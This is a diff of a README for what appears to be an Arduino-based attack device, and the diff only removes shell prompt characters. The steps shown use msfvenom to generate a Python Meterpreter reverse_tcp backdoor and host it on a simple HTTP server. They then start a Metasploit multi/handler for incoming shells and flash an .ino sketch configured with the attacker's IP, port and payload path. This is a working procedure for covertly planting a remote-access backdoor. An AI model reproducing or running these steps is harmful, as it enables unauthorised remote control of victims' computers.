@@ -12,20 +12,20 @@ We need to use Metasploit Framework and simple http server, you can use Kali Lin
 
 1. Generate a backdoor file
 ```
-$ msfvenom payload python/meterpreter/reverse_tcp LHOST=attacker's IP LPORT=8080 > /var/www/html/path/to/file
+msfvenom payload python/meterpreter/reverse_tcp LHOST=attacker's IP LPORT=8080 > /var/www/html/path/to/file
 ```
 2. Run simple HTTP server 
 ```
-$ cd /var/www/html/
-$ python3 -m http.server 8081
+cd /var/www/html/
+python3 -m http.server 8081
 ```
 3. Open Metasploit and start multi-handler
 ```
-$ use exploit/multi/handler
-$ set payload python/meterpreter/reverse_tcp
-$ set LHOST attacker's IP
-$ set LPORT 8080
-$ run
+use exploit/multi/handler
+set payload python/meterpreter/reverse_tcp
+set LHOST attacker's IP
+set LPORT 8080
+run
 ```
 4. Download .ino file and Arduino IDE
 5. Update attacker's IP, host, port and path to backdoor file using Arduino IDE
